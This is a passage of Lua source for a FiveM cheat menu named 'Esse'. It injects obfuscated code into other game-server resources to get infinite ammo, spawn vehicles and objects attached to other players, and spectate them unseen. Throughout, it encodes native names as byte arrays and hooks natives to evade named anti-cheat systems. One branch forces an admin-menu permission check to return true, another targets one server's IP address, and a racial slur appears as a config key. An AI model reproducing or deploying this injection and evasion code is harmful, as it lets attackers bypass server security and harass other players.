            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        if not _G.EsseInfAmmo then
            _G.EsseInfAmmo = { enabled = false }
        end
        _G.EsseInfAmmo.enabled    = true
        local PlayerPedId_fn          = g({ 80, 108, 97, 121, 101, 114, 80, 101, 100, 73, 100 })
        local GetSelectedPedWeapon_fn = g({ 71, 101, 116, 83, 101, 108, 101, 99, 116, 101, 100, 80, 101, 100, 87, 101, 97, 112, 111, 110 })
        local GetHashKey_fn           = g({ 71, 101, 116, 72, 97, 115, 104, 75, 101, 121 })
        local GetAmmoInPedWeapon_fn   = g({ 71, 101, 116, 65, 109, 109, 111, 73, 110, 80, 101, 100, 87, 101, 97, 112, 111, 110 })
        local AddAmmoToPed_fn         = g({ 65, 100, 100, 65, 109, 109, 111, 84, 111, 80, 101, 100 })
        local DoesEntityExist_fn      = g({ 68, 111, 101, 115, 69, 110, 116, 105, 116, 121, 69, 120, 105, 115, 116 })
        local Wait_fn                 = g({ 87, 97, 105, 116 })

        local lastClip                = {} -- ped -> last known clip size

        local function initFlow(cb)
            local co = coroutine.create(cb)
            local function execCycle()
                while coroutine.status(co) ~= "dead" do
                    local ok, err = coroutine.resume(co)
                    if not ok then
                        print("^1[Esse InfAmmo] Coroutine error: ^7", err)
                        break
                    end
                    Wait_fn(0)
                end
            end
            execCycle()
        end

        if not _G.EsseWaveLoop then
            _G.EsseWaveLoop = true
            initFlow(function()
                while _G.EsseWaveLoop do
                    if _G.EsseInfAmmo.enabled then
                        local ped = PlayerPedId_fn()
                        if DoesEntityExist_fn(ped) then
                            local weapon = GetSelectedPedWeapon_fn(ped)
                            if weapon and weapon ~= GetHashKey_fn("WEAPON_UNARMED") then
                                local _, clip = GetAmmoInPedWeapon_fn(ped, weapon)
                                local key = tostring(ped)

                                if not lastClip[key] then
                                    lastClip[key] = clip
                                end

                                if clip < lastClip[key] then
                                    AddAmmoToPed_fn(ped, weapon, lastClip[key] - clip)
                                end
                            end
                        end
                    else
                        coroutine.yield()
                    end
                    coroutine.yield()
                end
            end)
        end
    else
        if GetResourceState("ReaperV4") == 'started' then
            MachoInjectResourceRaw("any", [[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
        end
        local function _w(n)
            return Citizen.Wait(n)
        end
        if not _G.infiniteAmmoEnabled then
            _G.infiniteAmmoEnabled = true
            local function ammoLoop()
                if not _G.infiniteAmmoEnabled then return end
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                        _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                    end
                end
                Citizen.SetTimeout(100, ammoLoop)
            end
            ammoLoop()
        end
        ]])
        else
            Injection(
            GetResourceState("monitor") == "started" and "monitor" or
            GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
        end
        local function _w(n)
            return Citizen.Wait(n)
        end
        if not _G.infiniteAmmoEnabled then
            _G.infiniteAmmoEnabled = true
            local function ammoLoop()
                if not _G.infiniteAmmoEnabled then return end
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                        _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                    end
                end
                Citizen.SetTimeout(100, ammoLoop)
            end
            ammoLoop()
        end
        ]])
        end
    end
end

function Esse:DisableInfiniteAmmo()
    if GetResourceState("WaveShield") == "started" then
        Injection(
        GetResourceState("WaveShield") == "started" and "WaveShield" or
        GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
        if _G.EsseInfAmmo then
            _G.EsseInfAmmo.enabled = false
        end
    ]])
    else
        if GetResourceState("ReaperV4") == 'started' then
            MachoInjectResourceRaw("any", [[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
        end
        if _G.infiniteAmmoEnabled then
            _G.infiniteAmmoEnabled = false
            local ped = _g(_b("PlayerPedId"))()
            if ped and _g(_b("DoesEntityExist"))(ped) then
                local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                if weapon then
                    _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                    _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                end
            end
        end
        ]])
        else
            Injection(
            GetResourceState("monitor") == "started" and "monitor" or
            GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
        end
        if _G.infiniteAmmoEnabled then
            _G.infiniteAmmoEnabled = false
            local ped = _g(_b("PlayerPedId"))()
            if ped and _g(_b("DoesEntityExist"))(ped) then
                local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                if weapon then
                    _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                    _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                end
            end
        end
        ]])
        end
    end
end

function Esse:AttachSelectedVehicle(playerIds, vehicleModel)
    if not playerIds or #playerIds == 0 then
        self:Notify("error", "Esse", "No players selected!", 3000)
        return
    end
    if not vehicleModel or #vehicleModel == 0 then
        self:Notify("error", "Esse", "Invalid vehicle model!", 3000)
        return
    end

    local function encodeToByteArrayLiteral(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return table.concat(t, ",")
    end


    local model = vehicleModel
    local modelBytes = encodeToByteArrayLiteral(model)
    local serverEndpoint = GetCurrentServerEndpoint()
    local successCount = 0

    for _, playerId in ipairs(playerIds) do
        if GetResourceState("solos-rentals") == "started" then
            local success, err = pcall(function()
                MachoInjectResource2("AsThreadNs", "solos-rentals", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                config.locations["customnigga"] = {
                    vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                }
                TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                    end
                end)
            ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
        elseif GetResourceState("amigo") == "started" then
            local success, err = pcall(function()
                MachoInjectResourceRaw("adminMenu", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                local originalHasPerm = hasPerm
                hasPerm = function(perm) return true end

                local originalIsModelInCdimage = IsModelInCdimage
                IsModelInCdimage = function(model) return true end

                local veh = spawnVeh(model)

                hasPerm = originalHasPerm
                IsModelInCdimage = originalIsModelInCdimage

                Citizen.Wait(200)
                if %s then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                    end
                end
            ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
        elseif GetResourceState("qb-core") == "started" then
            local success, err = pcall(function()
                MachoInjectResource2("AsThreadNs", "qb-core", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                local coords = GetEntityCoords(ped)
                QBCore.Functions.SpawnVehicle(model, function(vehicle)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                    end
                end, coords, true, true)
            ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
        elseif serverEndpoint:match("([^:]+)") == "185.244.106.12" and GetResourceState("drc_gardener") == "started" then
            local success, err = pcall(function()
                MachoInjectResource2("AsThreadNs", "drc_gardener", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                local coords = GetEntityCoords(ped)
                SpawnVehicleAndWarpPlayer(model, coords)
            ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
        elseif GetResourceState("lunar_bridge") == "started" then
            local success, err = pcall(function()
                MachoInjectResourceRaw("lunar_bridge", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                Framework.spawnVehicle(model, coords, heading, function(vehicle)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                    end
                end)
            ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
        elseif GetResourceState("lation_laundering") == "started" then
            local success, err = pcall(function()
                MachoInjectResourceRaw("lation_laundering", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                local vehicle = SpawnVehicle(model, position)
                if vehicle and DoesEntityExist(vehicle) then
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                    SetPedIntoVehicle(ped, vehicle, -1)
                    ShowNotification("~g~Vehicle attached successfully!")
                end
            ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
        else
            local success, err = pcall(function()
                local script = string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                RequestModel(model)
                local maxAttempts = 20
                local attempts = 0
                while not HasModelLoaded(model) and attempts < maxAttempts do
                    Citizen.Wait(500)
                    attempts = attempts + 1
                end
                if attempts >= maxAttempts then return end

                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end

                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                if vehicle and DoesEntityExist(vehicle) then
                    AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                    SetPedIntoVehicle(ped, vehicle, -1)
                    SetModelAsNoLongerNeeded(model)
                end
            ]], modelBytes, playerId)
                MachoInjectResourceRaw("any", script, playerId)
            end)
            if success then successCount = successCount + 1 end
        end
    end
end

function encodeToByteArrayLiteral(str)
    if not str then return "" end
    if type(str) ~= "string" then
        return tostring(str)
    end
    if #str == 0 then return "" end
    local bytes = {}
    for i = 1, #str do
        bytes[#bytes + 1] = tostring(string.byte(str, i))
    end
    return table.concat(bytes, ", ")
end

function Esse:SpawnSelectedObject(playerIds)
    if not playerIds or #playerIds == 0 then
        self:Notify("error", "Esse", "No players selected!", 3000)
        return
    end
    local model = self:GetSelectedObjectModel()
    if not model or #model == 0 then
        self:Notify("error", "Esse", "Invalid object model!", 3000)
        return
    end
    local modelBytes = encodeToByteArrayLiteral(model)
    local successCount = 0
    for _, playerId in ipairs(playerIds) do
        if GetResourceState("qb-core") == "started" or GetResourceState("mc9-core") == "started" and
            (GetResourceState("ElectronAC") == "started" or
                GetResourceState("FiniAC") == "started" or
                GetResourceState("ReaperV4") == "started" or
                GetResourceState("WaveShield") == "started") then
            self:Notify("error", "Esse", "Using Qb-core Spawner!", 3000)
            MachoInjectResource2("AsThreadNs", "qb-core", string.format([[
            local function decode(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local model = decode({%s})
            local hash = type(model) == 'string' and joaat(model) or model
            QBCore.Functions.LoadModel(hash)
            local player = GetPlayerFromServerId(%d)
            if player == -1 then return end
            local ped = GetPlayerPed(player)
            if not ped or ped == 0 then return end
            local coords = GetEntityCoords(ped)
            local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
            if obj and DoesEntityExist(obj) then
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                SetModelAsNoLongerNeeded(hash)
            end
        ]], modelBytes, playerId))
            successCount = successCount + 1
        elseif GetResourceState("cd_dispatch") == "started" then
            -- Dedicated cd_dispatch branch: Hook CreateObject for hash override and model loading
            MachoInjectResource2("AsThreadNs", "cd_dispatch", string.format([[
            local function decode(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local model = decode({%s})
            local hash = type(model) == 'string' and GetHashKey(model) or model

            -- Hook CreateObject to override hash and ensure model loading
            local originalCreateObject = CreateObject
            CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                if type(objHash) == 'number' and objHash ~= hash then
                    -- Override with our custom hash for this spawn
                    objHash = hash
                end
                RequestModel(objHash)
                while not HasModelLoaded(objHash) do
                    Citizen.Wait(0)
                end
                local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                SetModelAsNoLongerNeeded(objHash)
                return obj
            end

            -- Spawn the object on target player
            local player = GetPlayerFromServerId(%d)
            if player == -1 then
                CreateObject = originalCreateObject
                return
            end
            local ped = GetPlayerPed(player)
            if not ped or ped == 0 then
                CreateObject = originalCreateObject
                return
            end
            local coords = GetEntityCoords(ped)
            local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
            if obj and DoesEntityExist(obj) then
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
            end

            -- Restore original CreateObject
            CreateObject = originalCreateObject
        ]], modelBytes, playerId))
            successCount = successCount + 1
        elseif GetResourceState("rcore_drunk") == "started" then
            MachoInjectResourceRaw("rcore_drunk", string.format([[
            local model = "%s"
            local player = GetPlayerFromServerId(%d)
            if player == -1 then return end
            local ped = GetPlayerPed(player)
            if not ped or ped == 0 then return end
            local coords = GetEntityCoords(ped)
            local hash = GetHashKey(model)
            RequestModel(hash)
            while not HasModelLoaded(hash) do Citizen.Wait(0) end
            local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
            AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
        ]], model, playerId))
            successCount = successCount + 1
        elseif GetResourceState("lc_fuel") == "started" then
            MachoInjectResourceRaw("lc_fuel", string.format([[
            local function spawnObj()
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                Config.NozzleProps.gas = model
                local entity = createFuelNozzleObject()
                SetEntityCoords(entity, coords)
            end
            spawnObj()
        ]], model, playerId))
            successCount = successCount + 1
        elseif GetResourceState("0r-illegalpack") == "started" then
            MachoInjectResourceRaw("0r-illegalpack", string.format([[
            local function spawnObj()
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
            end
            spawnObj()
        ]], model, playerId))
            successCount = successCount + 1
        elseif GetResourceState("xradio") == "started" then
            MachoInjectResourceRaw("xradio", string.format([[
            local function spawnObj()
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                CreateRadioObject(model, coords, function(entity)
                    print(entity)
                end)
            end
            spawnObj()
        ]], model, playerId))
            successCount = successCount + 1
        else
            MachoInjectResourceRaw("any", string.format([[
            local function decode(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local model = decode({%s})
            local hash = type(model) == 'string' and GetHashKey(model) or model
            RequestModel(hash)
            local attempts = 0
            while not HasModelLoaded(hash) and attempts < 20 do
                Citizen.Wait(100)
                attempts = attempts + 1
            end
            if attempts >= 20 then return end
            local player = GetPlayerFromServerId(%d)
            if player == -1 then return end
            local ped = GetPlayerPed(player)
            if not ped or ped == 0 then return end
            local coords = GetEntityCoords(ped)
            local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
            if obj and DoesEntityExist(obj) then
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                SetModelAsNoLongerNeeded(hash)
            end
        ]], modelBytes, playerId))
            successCount = successCount + 1
        end
    end
    self:Notify("success", "Esse",
        string.format("Object '%s' spawned on %d/%d player(s)!", model, successCount, #playerIds), 5000)
end

-- Global spectate state stored outside injected code
if not _G.EsseSpectateState then
    _G.EsseSpectateState = { enabled = false, back = nil, heading = nil, wasVisible = true, targetSid = nil }
end

-- Monitor spectate target - auto-stop if player leaves
CreateThread(function()
    while true do
        Wait(1000)
        if _G.EsseSpectateState and _G.EsseSpectateState.enabled and _G.EsseSpectateState.targetSid then
            local player = GetPlayerFromServerId(_G.EsseSpectateState.targetSid)
            if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                -- Player left, auto-stop spectate
                local me = PlayerPedId()
                NetworkSetInSpectatorMode(false, me)
                RenderScriptCams(false, false, 0, true, true)
                TriggerEvent("Esse:StopSpectateLoop")
                FreezeEntityPosition(me, false)
                SetEntityCollision(me, true, true)
                SetEntityVisible(me, true, false)
                SetEntityInvincible(me, false)
                if _G.EsseSpectateState.back then
                    RequestCollisionAtCoord(_G.EsseSpectateState.back.x, _G.EsseSpectateState.back.y,
                        _G.EsseSpectateState.back.z)
                    Wait(500)
                    SetEntityCoords(me, _G.EsseSpectateState.back.x, _G.EsseSpectateState.back.y,
                        _G.EsseSpectateState.back.z, false, false, false, true)
                end
                if _G.EsseSpectateState.heading then
                    SetEntityHeading(me, _G.EsseSpectateState.heading)
                end
                _G.EsseSpectateState.enabled = false
                _G.EsseSpectateState.targetSid = nil
                Esse:Notify("warning", "Esse", "Player left - spectate stopped!", 3000)
            end
        end
    end
end)

function Esse:HandleSpectateToggle(playerId, enabled)
    if not playerId then
        self:Notify("error", "Esse", "Invalid player ID provided!", 3000)
        return
    end
    local targetServerId = tonumber(playerId)
    if not targetServerId then
        self:Notify("error", "Esse", "Invalid server ID format!", 3000)
        return
    end
    if targetServerId == tonumber(GetPlayerServerId(PlayerId())) then
        self:Notify("error", "Esse", "You cannot spectate yourself!", 3000)
        return
    end

    -- Handle STOP spectate directly here (not in injected code)
    if not enabled then
        local me = PlayerPedId()
        -- Always try to stop spectate mode and cameras (in case state was lost)
        NetworkSetInSpectatorMode(false, me)
        RenderScriptCams(false, false, 0, true, true) -- Stop any script cameras (for camera-based spectate)
        TriggerEvent("Esse:StopSpectateLoop") -- Signal any running spectate loops to stop
        FreezeEntityPosition(me, false)
        SetEntityCollision(me, true, true)
        SetEntityVisible(me,
            _G.EsseSpectateState.wasVisible == nil and true or _G.EsseSpectateState.wasVisible, false)
        SetEntityInvincible(me, false)
        if _G.EsseSpectateState.back then
            RequestCollisionAtCoord(_G.EsseSpectateState.back.x, _G.EsseSpectateState.back.y,
                _G.EsseSpectateState.back.z)
            SetEntityCoords(me, _G.EsseSpectateState.back.x, _G.EsseSpectateState.back.y,
                _G.EsseSpectateState.back.z, false, false, false, true)
        end
        if _G.EsseSpectateState.heading then
            SetEntityHeading(me, _G.EsseSpectateState.heading)
        end
        _G.EsseSpectateState.enabled = false
        _G.EsseSpectateState.targetSid = nil
        self:Notify("success", "Esse", ("Stopped spectating player [%s]!"):format(targetServerId), 3000)
        return
    end

    -- Handle START spectate
    if not GetPlayerName(GetPlayerFromServerId(targetServerId)) then
        self:Notify("error", "Esse", "Target player not found!", 3000)
        return
    end

    -- Save current position before spectating
    local me = PlayerPedId()
    local myCoords = GetEntityCoords(me)
    _G.EsseSpectateState.back = vector3(myCoords.x, myCoords.y, myCoords.z)
    _G.EsseSpectateState.heading = GetEntityHeading(me)
    _G.EsseSpectateState.wasVisible = IsEntityVisible(me)
    _G.EsseSpectateState.enabled = true
    _G.EsseSpectateState.targetSid = targetServerId

    local reaper = GetResourceState('ReaperV4') == 'started'
    local finiAC = GetResourceState('FiniAC') == 'started'
    local electronAC = GetResourceState('ElectronAC') == 'started'

    if reaper then
        if not GetPlayerName(GetPlayerFromServerId(targetServerId)) then
            self:Notify("error", "Esse", "Target player not found!", 3000)
            print("[ReaperV4 Spectate] Error: No player found for server ID:", targetServerId)
            return
        end
        local code = string.format([[
        local function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                return
            end
            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end
        local function _t()
            local createThread = _G[_d(_b("CreateThread"))]
            if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
            return createThread
        end
        HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
        HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
        HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
        HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
        HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
        HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
        HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
        HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
        HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
        HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
        HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
        HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
        HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
        HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
        HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
        HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            if not players then
                print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                return -1
            end
            print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
            for _, pid in ipairs(players) do
                local serverId = _g(_b("GetPlayerServerId"))(pid)
                print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                if serverId == sid then
                    print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                    return pid
                end
            end
            print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
            return -1
        end
        local function startSpectate(targetSid)
            local me = _g(_b("PlayerPedId"))()
            if not me then
                print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                return
            end
            local clientId = findClientIdByServerId(targetSid)
            local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
            if clientId == -1 or targetPed == 0 then
                print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                _G.EsseSpectateState.enabled = false
                return
            end
            local tCoords = _g(_b("GetEntityCoords"))(targetPed)
            if not tCoords then
                print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                _G.EsseSpectateState.enabled = false
                return
            end
            _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
            _g(_b("SetEntityInvincible"))(me, true)
            local zOffset = 15.0
            _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
            _w(300)
            _g(_b("FreezeEntityPosition"))(me, true)
            local success, err = pcall(function()
                _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
            end)
            if not success then
                print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                _G.EsseSpectateState.enabled = false
                return
            end
            print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
            _t()(function()
                while _G.EsseSpectateState and _G.EsseSpectateState.enabled do
                    local cid = findClientIdByServerId(_G.EsseSpectateState.targetSid or targetSid)
                    if cid == -1 then break end
                    local ped = _g(_b("GetPlayerPed"))(cid)
                    if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                    local pc = _g(_b("GetEntityCoords"))(ped)
                    if not pc then break end
                    _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                    _w(400)
                end
                print("[ReaperV4 Spectate] Loop ended, spectate stopped")
            end)
        end
        local sid = %d
        print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
        startSpectate(sid)
    ]], targetServerId)

        local fn, err = load(code)
        if fn then
            local success, result = pcall(fn)
            if not success then
                print("[ReaperV4 Spectate] Execution error:", result)
                self:Notify("error", "Esse", "Failed to execute spectate code!", 3000)
            else
                print("[ReaperV4 Spectate] Code executed successfully")
            end
        else
            print("[ReaperV4 Spectate] Load error:", err)
            self:Notify("error", "Esse", "Failed to load spectate code!", 3000)
        end
    else
        if GetResourceState('FiniAC') == 'started' or GetResourceState('ElectronAC') == 'started' then
            print('Spectate Fallback #1')
            MachoInjectResourceRaw("any", string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
